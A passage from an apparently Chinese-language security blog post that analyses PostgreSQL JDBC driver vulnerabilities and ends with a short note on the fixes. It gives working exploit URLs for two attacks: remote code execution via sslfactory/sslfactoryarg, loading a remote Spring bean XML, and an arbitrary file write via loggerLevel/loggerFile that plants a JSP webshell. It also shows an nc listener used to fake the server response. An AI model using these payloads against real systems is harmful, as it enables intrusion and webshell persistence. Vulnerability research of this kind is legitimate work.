+<p>configResources默认为空，那么会获取ConfigLocations作为classpath去加载并且解析xml </p>
+<p>那么需要⼀个恶意xml⽂件，poc通过SpEL表达式来造成RCE</p>
+<h2 id="任意代码执⾏-sslfactory-sslfactoryarg"><a href="#任意代码执⾏-sslfactory-sslfactoryarg" class="headerlink" title="任意代码执⾏ sslfactory&#x2F;sslfactoryarg"></a>任意代码执⾏ sslfactory&#x2F;sslfactoryarg</h2><p>回到ConnectionFactoryImpl#openConnectionImpl⽅法，除了调⽤SocketFactoryFactory.getSocketFactory⽅法，还调⽤了 tryConnect⽅法可以利⽤（主要关注info的出处，数据可控）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newStream = <span class="built_in">this</span>.tryConnect(user, database, info, socketFactory, hostSpec, sslMode, gssEncMode);</span><br></pre></td></tr></table></figure>
+
+<p>跟进tryConnect方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!newStream.isGssEncrypted()) &#123;</span><br><span class="line">    newStream = <span class="built_in">this</span>.enableSSL(newStream, sslMode, info, connectTimeout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>默认isGssEncrypted⽅法返回为false，调⽤了enableSSL⽅法 在enableSSL⽅法找到info出处</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">beresp</span> <span class="operator">=</span> pgStream.receiveChar();</span><br><span class="line"><span class="keyword">switch</span> (beresp) &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> <span class="number">83</span>:</span><br><span class="line">                    LOGGER.log(Level.FINEST, <span class="string">&quot; &lt;=BE SSLOk&quot;</span>);</span><br><span class="line">                    MakeSSL.convert(pgStream, info);</span><br><span class="line">                    <span class="keyword">return</span> pgStream;</span><br><span class="line">...</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进⼊对应switch case语句还需通过pgStream.receiveChar⽅法判断，需要响应的第⼀个字⺟为S </p>
+<p>那么就会调⽤org.postgresql.ssl.MakeSSL.convert⽅法，⽅法中调⽤了SocketFactoryFactory.getSslSocketFactory⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SSLSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SocketFactoryFactory.getSslSocketFactory(info);</span><br></pre></td></tr></table></figure>
+
+<p>在getSslSocketFactory⽅法中，同样调⽤了ObjectFactory.instantiate⽅法进⾏实例化类</p>
+<p>和上面差不多</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SocketFactory</span> <span class="variable">socketFactory</span> <span class="operator">=</span> SocketFactoryFactory.getSocketFactory(info);</span><br></pre></td></tr></table></figure>
+
+<p>由sslfactory和sslfactoryarg两个扩展参数传递</p>
+<p>payload:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//localhost:1234/baicany?sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;sslfactoryarg=http://127.0.0.1:8080/bean.xml</span></span><br></pre></td></tr></table></figure>
+
+<p>现在需要解决PostgreSQL响应的第⼀个字⺟为S</p>
+<p>开启⼀个监听</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -l -p <span class="number">1234</span></span><br></pre></td></tr></table></figure>
+
+<p>向监听端⼝发起jdbc请求，此时程序发⽣阻塞，键⼊S后，将成功代码执⾏</p>
+<h2 id="任意⽂件写⼊-loggerLevel-loggerFile"><a href="#任意⽂件写⼊-loggerLevel-loggerFile" class="headerlink" title="任意⽂件写⼊ loggerLevel&#x2F;loggerFile"></a>任意⽂件写⼊ loggerLevel&#x2F;loggerFile</h2><p>在org.postgresql.Driver#connect⽅法下，在执⾏makeConnection⽅法前，还会调⽤setupLoggerFromProperties⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">driverLogLevel</span> <span class="operator">=</span> PGProperty.LOGGER_LEVEL.get(props);</span><br><span class="line"><span class="keyword">if</span> (driverLogLevel != <span class="literal">null</span>) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>想要继续往下调⽤，需要driverLogLevel不为null</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOGGER_LEVEL(<span class="string">&quot;loggerLevel&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;Logger level of the driver&quot;</span>, <span class="literal">false</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;OFF&quot;</span>, <span class="string">&quot;DEBUG&quot;</span>, <span class="string">&quot;TRACE&quot;</span>&#125;),</span><br></pre></td></tr></table></figure>
+
+<p>默认为null,可以通过扩展参数修改</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">loggerLevel</span><span class="operator">=</span>DEBUG</span><br></pre></td></tr></table></figure>
+
+<p>继续往下发现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">driverLogFile</span> <span class="operator">=</span> PGProperty.LOGGER_FILE.get(exprProps);</span><br><span class="line">             <span class="keyword">if</span> (driverLogFile == <span class="literal">null</span> || !driverLogFile.equals(loggerHandlerFile)) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>需要driverLogFile不为空,才行</p>
+<p>表⽰⽇志⽂件的保存位置，LOGGER.log⽅法能向⽇志⽂件写⼊信息</p>
+<p>利⽤这个思路可做JSP WebShell，将JSP恶意代码添加进URL中，然后⼀起写进⽂件中</p>
+<p>exp:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//localhost:5432/baicany?loggerLevel=DEBUG&amp;loggerFile=/Users/baicany/Desktop/baicany.jsp&amp;shellcode</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>针对代码执行的漏洞而言，要求获取的类名必须是指定类的子类，否则就抛出异常</p>
+<p><img src="https://baicany.github.io/images/image-20231029230416814.png" alt="image-20231029230416814"></p>
+<p>对于任意⽂件写⼊⽽⾔，⾼版本中移除了对⽇志⽂件的设定操作 setupLoggerFromProperties(props);</p>
+<p><img src="https://baicany.github.io/images/image-20231029230431095.png" alt="image-20231029230431095"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/10/24/jdbc/" rel="prev" title="jdbc">
+                  <i class="fa fa-angle-left"></i> jdbc
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/10/31/Gson/" rel="next" title="java Gson">
+                  java Gson <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baicany</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right"},"mobile":{"show":true}});</script></body>
+</html>
